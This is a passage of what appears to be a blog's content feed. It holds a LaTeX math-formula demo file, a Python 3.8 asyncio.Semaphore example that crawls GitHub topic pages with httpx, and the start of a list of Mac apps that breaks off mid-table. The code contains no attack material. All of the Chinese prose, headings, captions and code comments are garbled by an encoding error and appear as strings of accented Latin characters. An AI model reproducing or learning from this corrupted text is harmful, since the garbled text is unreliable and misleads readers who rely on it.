alt="Áî®TeXworksÁºñÂÜôdemo" /><figcaption>Áî®TeXworksÁºñÂÜôdemo</figcaption></figure><figure><img src="2.png" alt="Ê∏≤Êüìpdf" /><figcaption>Ê∏≤Êüìpdf</figcaption></figure><h1 id="ÁºñÂÜôÂÖ¨Âºè">ÁºñÂÜôÂÖ¨Âºè</h1><p>ÁºñÂÜôÊµãËØïÊï∞Â≠¶ÂÖ¨ÂºèÔºå‰ª£Á†ÅÊù•Ê∫ê‰∫é<span class="exturl" data-url="aHR0cHM6Ly9saWFtLnBhZ2UvMjAxNC8wOS8wOC9sYXRleC1pbnRyb2R1Y3Rpb24v">‰∏Ä‰ªΩÂÖ∂ÂÆûÂæàÁü≠ÁöÑ LaTeX ÂÖ•Èó®ÊñáÊ°£<i class="fa fa-external-link-alt"></i></span></p><details><p><summary> ÂÖ¨ÂºèÊµãËØï‰ª£Á†Å </summary></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">\<span class="name">documentclass</span><span class="string">[UTF8]</span><span class="string">&#123;ctexart&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">usepackage</span><span class="string">&#123;amsmath&#125;</span></span>  <span class="comment">% ‰∏∫‰∫Ü‰ΩøÁî® AMS-LaTeX Êèê‰æõÁöÑÊï∞Â≠¶ÂäüËÉΩÔºåÊàë‰ª¨ÈúÄË¶ÅÂú®ÂØºË®ÄÂå∫Âä†ËΩΩ amsmath ÂÆèÂåÖ</span></span><br><span class="line"><span class="tag">\<span class="name">ctexset</span><span class="string">&#123;section/format=\Large\bfseries&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;document&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">section</span><span class="string">&#123;‰∏ä‰∏ãÊ†á&#125;</span></span></span><br><span class="line">Einstein 's <span class="formula">$E=mc^2$</span>.</span><br><span class="line"><span class="tag">\<span class="name">[</span></span> E=mc^2. <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;equation&#125;</span></span></span><br><span class="line">E=mc^2.</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;equation&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">section</span><span class="string">&#123;Ê†πÂºè‰∏éÂàÜÂºè&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="formula">$<span class="tag">\<span class="name">sqrt</span><span class="string">&#123;x&#125;</span></span>$</span>, <span class="formula">$<span class="tag">\<span class="name">frac</span><span class="string">&#123;1&#125;</span><span class="string">&#123;2&#125;</span></span>$</span>.</span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">sqrt</span><span class="string">&#123;x&#125;</span></span>, <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">frac</span><span class="string">&#123;1&#125;</span><span class="string">&#123;2&#125;</span></span>. <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> z = r<span class="tag">\<span class="name">cdot</span></span> e^&#123;2<span class="tag">\<span class="name">pi</span></span> i&#125;. <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">section</span><span class="string">&#123;ËøêÁÆóÁ¨¶&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">pm</span></span><span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">times</span></span> <span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">div</span></span><span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">cdot</span></span><span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">cap</span></span><span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">cup</span></span><span class="tag">\<span class="name">;</span></span></span><br><span class="line"><span class="tag">\<span class="name">geq</span></span><span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">leq</span></span><span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">neq</span></span><span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">approx</span></span> <span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">equiv</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"><span class="formula">$ <span class="tag">\<span class="name">sum</span></span>_&#123;i=1&#125;^n i<span class="tag">\<span class="name">quad</span></span> <span class="tag">\<span class="name">prod</span></span>_&#123;i=1&#125;^n $</span></span><br><span class="line"><span class="formula">$ <span class="tag">\<span class="name">sum</span></span><span class="tag">\<span class="name">limits</span></span> _&#123;i=1&#125;^n i<span class="tag">\<span class="name">quad</span></span> <span class="tag">\<span class="name">prod</span></span><span class="tag">\<span class="name">limits</span></span> _&#123;i=1&#125;^n $</span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">lim</span></span>_&#123;x<span class="tag">\<span class="name">to</span></span>0&#125;x^2 <span class="tag">\<span class="name">quad</span></span> <span class="tag">\<span class="name">int</span></span>_a^b x^2 dx <span class="tag">\<span class="name">]</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">lim</span></span><span class="tag">\<span class="name">nolimits</span></span> _&#123;x<span class="tag">\<span class="name">to</span></span>0&#125;x^2<span class="tag">\<span class="name">quad</span></span> <span class="tag">\<span class="name">int</span></span><span class="tag">\<span class="name">nolimits</span></span>_a^b x^2 dx <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">iint</span></span><span class="tag">\<span class="name">quad</span></span> <span class="tag">\<span class="name">iiint</span></span><span class="tag">\<span class="name">quad</span></span> <span class="tag">\<span class="name">iiiint</span></span><span class="tag">\<span class="name">quad</span></span> <span class="tag">\<span class="name">idotsint</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">section</span><span class="string">&#123;ÂÆöÁïåÁ¨¶ÔºàÊã¨Âè∑Á≠âÔºâ&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">Biggl</span></span>(<span class="tag">\<span class="name">biggl</span></span>(<span class="tag">\<span class="name">Bigl</span></span>(<span class="tag">\<span class="name">bigl</span></span>((x)<span class="tag">\<span class="name">bigr</span></span>)<span class="tag">\<span class="name">Bigr</span></span>)<span class="tag">\<span class="name">biggr</span></span>)<span class="tag">\<span class="name">Biggr</span></span>) <span class="tag">\<span class="name">]</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">Biggl</span><span class="string">[\biggl[\Bigl[\bigl[[x]</span></span><span class="tag">\<span class="name">bigr</span></span>]<span class="tag">\<span class="name">Bigr</span></span>]<span class="tag">\<span class="name">biggr</span></span>]<span class="tag">\<span class="name">Biggr</span></span>] <span class="tag">\<span class="name">]</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">Biggl</span></span> <span class="tag">\<span class="name">&#123;</span></span><span class="tag">\<span class="name">biggl</span></span> <span class="tag">\<span class="name">&#123;</span></span><span class="tag">\<span class="name">Bigl</span></span> <span class="tag">\<span class="name">&#123;</span></span><span class="tag">\<span class="name">bigl</span></span> <span class="tag">\<span class="name">&#123;</span></span><span class="tag">\<span class="name">&#123;</span></span>x<span class="tag">\<span class="name">&#125;</span></span><span class="tag">\<span class="name">bigr</span></span> <span class="tag">\<span class="name">&#125;</span></span><span class="tag">\<span class="name">Bigr</span></span> <span class="tag">\<span class="name">&#125;</span></span><span class="tag">\<span class="name">biggr</span></span> <span class="tag">\<span class="name">&#125;</span></span><span class="tag">\<span class="name">Biggr</span></span><span class="tag">\<span class="name">&#125;</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">Biggl</span></span><span class="tag">\<span class="name">langle</span></span><span class="tag">\<span class="name">biggl</span></span><span class="tag">\<span class="name">langle</span></span><span class="tag">\<span class="name">Bigl</span></span><span class="tag">\<span class="name">langle</span></span><span class="tag">\<span class="name">bigl</span></span><span class="tag">\<span class="name">langle</span></span><span class="tag">\<span class="name">langle</span></span> x</span><br><span class="line"><span class="tag">\<span class="name">rangle</span></span><span class="tag">\<span class="name">bigr</span></span><span class="tag">\<span class="name">rangle</span></span><span class="tag">\<span class="name">Bigr</span></span><span class="tag">\<span class="name">rangle</span></span><span class="tag">\<span class="name">biggr</span></span><span class="tag">\<span class="name">rangle</span></span><span class="tag">\<span class="name">Biggr</span></span><span class="tag">\<span class="name">rangle</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">Biggl</span></span><span class="tag">\<span class="name">lvert</span></span><span class="tag">\<span class="name">biggl</span></span><span class="tag">\<span class="name">lvert</span></span><span class="tag">\<span class="name">Bigl</span></span><span class="tag">\<span class="name">lvert</span></span><span class="tag">\<span class="name">bigl</span></span><span class="tag">\<span class="name">lvert</span></span><span class="tag">\<span class="name">lvert</span></span> x</span><br><span class="line"><span class="tag">\<span class="name">rvert</span></span><span class="tag">\<span class="name">bigr</span></span><span class="tag">\<span class="name">rvert</span></span><span class="tag">\<span class="name">Bigr</span></span><span class="tag">\<span class="name">rvert</span></span><span class="tag">\<span class="name">biggr</span></span><span class="tag">\<span class="name">rvert</span></span><span class="tag">\<span class="name">Biggr</span></span><span class="tag">\<span class="name">rvert</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">Biggl</span></span><span class="tag">\<span class="name">lVert</span></span><span class="tag">\<span class="name">biggl</span></span><span class="tag">\<span class="name">lVert</span></span><span class="tag">\<span class="name">Bigl</span></span><span class="tag">\<span class="name">lVert</span></span><span class="tag">\<span class="name">bigl</span></span><span class="tag">\<span class="name">lVert</span></span><span class="tag">\<span class="name">lVert</span></span> x</span><br><span class="line"><span class="tag">\<span class="name">rVert</span></span><span class="tag">\<span class="name">bigr</span></span><span class="tag">\<span class="name">rVert</span></span><span class="tag">\<span class="name">Bigr</span></span><span class="tag">\<span class="name">rVert</span></span><span class="tag">\<span class="name">biggr</span></span><span class="tag">\<span class="name">rVert</span></span><span class="tag">\<span class="name">Biggr</span></span><span class="tag">\<span class="name">rVert</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line">(x)</span><br><span class="line"><span class="tag">\<span class="name">[</span></span>  <span class="tag">\<span class="name">bigl</span></span>((x)<span class="tag">\<span class="name">bigr</span></span>) <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">section</span><span class="string">&#123;ÁúÅÁï•Âè∑&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> x_1,x_2,<span class="tag">\<span class="name">dots</span></span> ,x_n<span class="tag">\<span class="name">quad</span></span> 1,2,<span class="tag">\<span class="name">cdots</span></span> ,n<span class="tag">\<span class="name">quad</span></span></span><br><span class="line"><span class="tag">\<span class="name">vdots</span></span><span class="tag">\<span class="name">quad</span></span> <span class="tag">\<span class="name">ddots</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">section</span><span class="string">&#123;Áü©Èòµ&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">begin</span><span class="string">&#123;pmatrix&#125;</span></span> a&amp;b<span class="tag">\<span class="name">\</span></span>c&amp;d <span class="tag">\<span class="name">end</span><span class="string">&#123;pmatrix&#125;</span></span> <span class="tag">\<span class="name">quad</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;bmatrix&#125;</span></span> a&amp;b<span class="tag">\<span class="name">\</span></span>c&amp;d <span class="tag">\<span class="name">end</span><span class="string">&#123;bmatrix&#125;</span></span> <span class="tag">\<span class="name">quad</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;Bmatrix&#125;</span></span> a&amp;b<span class="tag">\<span class="name">\</span></span>c&amp;d <span class="tag">\<span class="name">end</span><span class="string">&#123;Bmatrix&#125;</span></span> <span class="tag">\<span class="name">quad</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;vmatrix&#125;</span></span> a&amp;b<span class="tag">\<span class="name">\</span></span>c&amp;d <span class="tag">\<span class="name">end</span><span class="string">&#123;vmatrix&#125;</span></span> <span class="tag">\<span class="name">quad</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;Vmatrix&#125;</span></span> a&amp;b<span class="tag">\<span class="name">\</span></span>c&amp;d <span class="tag">\<span class="name">end</span><span class="string">&#123;Vmatrix&#125;</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line">Marry has a little matrix <span class="formula">$ ( <span class="tag">\<span class="name">begin</span><span class="string">&#123;smallmatrix&#125;</span></span> a&amp;b<span class="tag">\<span class="name">\</span></span>c&amp;d <span class="tag">\<span class="name">end</span><span class="string">&#123;smallmatrix&#125;</span></span> ) $</span>.</span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">section</span></span>(Â§öË°åÂÖ¨Âºè)</span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">subsection</span><span class="string">&#123;ÈïøÂÖ¨Âºè&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">subsubsection</span><span class="string">&#123;‰∏çÂØπÈΩê&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;multline&#125;</span></span></span><br><span class="line">x = a+b+c+&#123;&#125; <span class="tag">\<span class="name">\</span></span></span><br><span class="line">d+e+f+g</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;multline&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">subsubsection</span><span class="string">&#123;ÂØπÈΩê&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;multline*&#125;</span></span></span><br><span class="line">x = a+b+c+&#123;&#125; <span class="tag">\<span class="name">\</span></span></span><br><span class="line">d+e+f+g</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;multline*&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">subsection</span><span class="string">&#123;ÂÖ¨ÂºèÁªÑ&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;gather&#125;</span></span></span><br><span class="line">a = b+c+d <span class="tag">\<span class="name">\</span></span></span><br><span class="line">x = y+z</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;gather&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;align&#125;</span></span></span><br><span class="line">a &amp;= b+c+d <span class="tag">\<span class="name">\</span></span></span><br><span class="line">x &amp;= y+z</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;align&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">subsection</span><span class="string">&#123;ÂàÜÊÆµÂáΩÊï∞&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> y= <span class="tag">\<span class="name">begin</span><span class="string">&#123;cases&#125;</span></span></span><br><span class="line">-x,<span class="tag">\<span class="name">quad</span></span> x<span class="tag">\<span class="name">leq</span></span> 0 <span class="tag">\<span class="name">\</span></span></span><br><span class="line">x,<span class="tag">\<span class="name">quad</span></span> x&gt;0</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;cases&#125;</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;document&#125;</span></span></span><br></pre></td></tr></table></figure></details><p>Ê∏≤ÊüìÁöÑpdfÔºö</p><div class="pdfobject-container" data-target="math_example.pdf" data-height="800px"></div><h1 id="latexÊï∞Â≠¶ÂÖ¨ÂºèÁºñÂÜôËæÖÂä©Â∑•ÂÖ∑">LaTeXÊï∞Â≠¶ÂÖ¨ÂºèÁºñÂÜôËæÖÂä©Â∑•ÂÖ∑</h1><p>ÂØπLaTeXÁöÑÊï∞Â≠¶ÂÖ¨ÂºèËØ≠Ê≥ïËøò‰∏çÁÜüÊÇâÔºåÂèØ‰ª•‰ΩøÁî®‰∏ãÂàóÂ∑•ÂÖ∑ËæÖÂä©Ôºö</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9tYXRocGl4LmNvbS8=">Mathpix<i class="fa fa-external-link-alt"></i></span>ÔºöÊà™Âõæ =&gt; OCR =&gt; LaTexËØ≠Ê≥ïÁöÑÊï∞Â≠¶ÂÖ¨Âºè</li><li><span class="exturl" data-url="aHR0cDovL2RldGV4aWZ5LmtpcmVsYWJzLm9yZy9jbGFzc2lmeS5odG1s">Detexify<i class="fa fa-external-link-alt"></i></span>ÔºöÊâãÂÜôÊï∞Â≠¶Á¨¶Âè∑ =&gt; ËØÜÂà´ =&gt; LaTexËØ≠Ê≥ïÁöÑÊï∞Â≠¶Á¨¶Âè∑</li><li><span class="exturl" data-url="aHR0cHM6Ly93ZWJkZW1vLm15c2NyaXB0LmNvbS92aWV3cy9tYXRoL2luZGV4Lmh0bWw=">Myscript.Math<i class="fa fa-external-link-alt"></i></span>ÔºöÊâãÂÜôÊï∞Â≠¶ÂÖ¨Âºè =&gt; ËØÜÂà´ =&gt; LaTexËØ≠Ê≥ïÁöÑÊï∞Â≠¶ÂÖ¨Âºè/ÁªòÂõæ</li></ul><h1 id="ÂèÇËÄÉÈìæÊé•">ÂèÇËÄÉÈìæÊé•</h1><ul><li><span class="exturl" data-url="aHR0cHM6Ly9saWFtLnBhZ2UvMjAxNC8wOS8wOC9sYXRleC1pbnRyb2R1Y3Rpb24v">‰∏Ä‰ªΩÂÖ∂ÂÆûÂæàÁü≠ÁöÑ LaTeX ÂÖ•Èó®ÊñáÊ°£<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL21pcnJvcnMuaWJpYmxpby5vcmcvQ1RBTi9sYW5ndWFnZS9jaGluZXNlL2N0ZXgvY3RleC5wZGY=">CTEX ÂÆèÈõÜÊâãÂÜå<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9kb2NzL3RhZy1wbHVnaW5zL3BkZi5odG1s">ÂàùÂøÉËÄÖ„ÅåBasicTex„Çímac„Å´„Ç§„É≥„Çπ„Éà„Éº„É´„Åô„Çã(2019Âπ¥)<i class="fa fa-external-link-alt"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> LaTeX </tag>
            
            <tag> Mac OS </tag>
            
            <tag> Math </tag>
            
            <tag> TeX </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 3.8+ÈáåÁöÑasyncioÂíåasyncio.Semaphore</title>
      <link href="/tech/asyncio-and-asyncio-semaphore-in-python-3-8/"/>
      <url>/tech/asyncio-and-asyncio-semaphore-in-python-3-8/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>asyncio and asyncio.Semaphore in Python 3.8+</strong></em></li><li>Author: dog2</li></ul><hr /><p>‰ª•ÂâçÁöÑÁ®ãÂ∫èÊîæÂú®Python 3.8ÈáåË∑ëÂá∫Èîô‰∫ÜÔºåÂéüÊù•ÊòØÁî±‰∫éPythonÂçáÁ∫ß3.8ÂêéÂçèÁ®ãÂ∫ì<code>asyncio</code>ÂèàÂèåÂèíÂèïÊõ¥Êñ∞‰∫Ü„ÄÇ Êñ∞ÁâàÊú¨Èáå<code>asyncio.Semaphore</code>ÁöÑÁî®Ê≥ïÊîπÂèò‰∫ÜÔºåÊú¨ÊñáÁÆÄÂçïËÆ∞ÂΩï‰∏Ä‰∏ãÊñ∞ÂÜôÊ≥ï„ÄÇ</p><a id="more"></a><p>‰ª£Á†ÅËØ¥ÊòéÔºöÁî®<span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLWh0dHB4Lm9yZy9hc3luYy8=">ÊîØÊåÅÂºÇÊ≠•<i class="fa fa-external-link-alt"></i></span>ÁöÑhttpÂ∫ì<span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLWh0dHB4Lm9yZy8=">httpx<i class="fa fa-external-link-alt"></i></span>ÁÆÄÂçïÁà¨Êï∞ÊçÆÔºåÁî®<code>asyncio.Semaphore</code>ÊéßÂà∂Âπ∂ÂèëÊï∞ÔºåËÄå<code>asyncio.Semaphore</code>Âú®Python 3.8‰∏≠ÈúÄË¶ÅÈÖçÂêà‰∏ä‰∏ãÊñáÁÆ°ÁêÜÂô®<code>contextvars.ContextVar</code>‰ΩøÁî®„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> contextvars <span class="keyword">import</span> ContextVar</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crawl</span><span class="params">(concurrency=<span class="number">3</span>)</span>:</span></span><br><span class="line">    context = ContextVar(<span class="string">"concurrent"</span>)  <span class="comment"># ÂÆö‰πâÂÖ®Â±Ä‰∏ä‰∏ãÊñáÁÆ°ÁêÜÂô®</span></span><br><span class="line">    URL_BASE = <span class="string">'https://github.com/topics?page='</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">crawl_one</span><span class="params">(i)</span>:</span></span><br><span class="line">        sem = context.get()  <span class="comment"># Ëé∑Âèñ‰∏ä‰∏ãÊñáÂÖ≥ÈîÆÂ≠ó</span></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> sem:</span><br><span class="line">            <span class="keyword">async</span> <span class="keyword">with</span> httpx.AsyncClient() <span class="keyword">as</span> client:</span><br><span class="line">                r = <span class="keyword">await</span> client.get(<span class="string">f"<span class="subst">&#123;URL_BASE&#125;</span><span class="subst">&#123;i&#125;</span>"</span>)</span><br><span class="line">                <span class="keyword">return</span> len(r.text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">crawl_all</span><span class="params">()</span>:</span></span><br><span class="line">        context.set(asyncio.Semaphore(concurrency)) <span class="comment">#‰∏ä‰∏ãÊñáÁÆ°ÁêÜÂô®ËµãÂÄºÔºåconcurrencyÊéßÂà∂Âπ∂ÂèëÊï∞</span></span><br><span class="line">        tasks = [asyncio.create_task(crawl_one(i)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>)] <span class="comment"># Â∞ÜÂçèÁ®ãÂ∞ÅË£ÖÊàê‰ªªÂä°ÂÖ±30‰∏™</span></span><br><span class="line">        done, pending = <span class="keyword">await</span> asyncio.wait(tasks) <span class="comment"># ÊâßË°åÊâÄÊúâ‰ªªÂä°</span></span><br><span class="line">        <span class="keyword">return</span> done</span><br><span class="line"></span><br><span class="line">    tasks_done = asyncio.run(crawl_all())</span><br><span class="line">    <span class="keyword">return</span> [t.result() <span class="keyword">for</span> t <span class="keyword">in</span> tasks_done]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> crawl(concurrency=<span class="number">1</span>):</span><br><span class="line">        print(r)</span><br></pre></td></tr></table></figure><p>ÂèÇËÄÉÈìæÊé•Ôºö - <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYy14LWEvcC8xMDg2ODQ5Ny5odG1s">Python ÂçèÁ®ãÊ®°Âùó asyncio ‰ΩøÁî®ÊåáÂçó<i class="fa fa-external-link-alt"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Async </tag>
            
            <tag> Coroutine </tag>
            
            <tag> Dev </tag>
            
            <tag> Python </tag>
            
            <tag> Semaphore </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÊàëÁöÑMacË£ÖÊú∫ËΩØ‰ª∂Ê±áÊÄª</title>
      <link href="/tech/my-mac-apps/"/>
      <url>/tech/my-mac-apps/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Overview of My Apps in Mac OS</strong></em></li><li>Author: dog2</li></ul><hr /><blockquote class="blockquote-center"><i class="fa fa-quote-left"></i><p>Â∑•Ê¨≤ÂñÑÂÖ∂‰∫ãÔºåÂøÖÂÖàÂà©ÂÖ∂Âô®</p><i class="fa fa-quote-right"></i></blockquote><ol type="1"><li>Â∏∏Áî®ÂøÖÂ§áËΩØ‰ª∂ÔºàChrome/QQÁ≠âÔºâÈô§Â§ñ</li><li>Êàë‰ΩøÁî®ÁöÑÊòØMac OSÔºåÂõ†Ê≠§ÂàóË°®‰∏≠Â∞èÈÉ®ÂàÜËΩØ‰ª∂ÂèØËÉΩÊ≤°ÊúâwindowsÁâàÊú¨</li></ol><a id="more"></a><h1 id="Âü∫Á°ÄËΩØ‰ª∂">Âü∫Á°ÄËΩØ‰ª∂</h1><table><thead><tr class="header"><th style="text-align: left;">Name</th><th style="text-align: left;">Type</th><th style="text-align: left;">Desc</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">AppManager</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">appÂç∏ËΩΩ</td></tr><tr class="even"><td style="text-align: left;">Colossus</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">CPU„ÄÅÂÜÖÂ≠ò„ÄÅÁΩëÁªúÊµÅÈáèÁ≠âÁõëÊéß</td></tr><tr class="odd"><td style="text-align: left;">Dr. Cleaner</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">ÂûÉÂúæÊñá‰ª∂Ê∏ÖÁêÜ„ÄÅÂÜÖÂ≠ò‰ºòÂåñ„ÄÅappÂç∏ËΩΩÁ≠â</td></tr><tr class="even"><td style="text-align: left;">Dr. Unarchiver</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">Ëß£ÂéãÁº©</td></tr><tr class="odd"><td style="text-align: left;">EBMac</td><td style="text-align: left;">Â≠¶‰π†</td><td style="text-align: left;">EPWINGÊ†ºÂºèÂ≠óÂÖ∏Âä†ËΩΩ</td></tr><tr class="even"><td style="text-align: left;">Find Exchange</td><td style="text-align: left;">ÈáëËûç</td><td 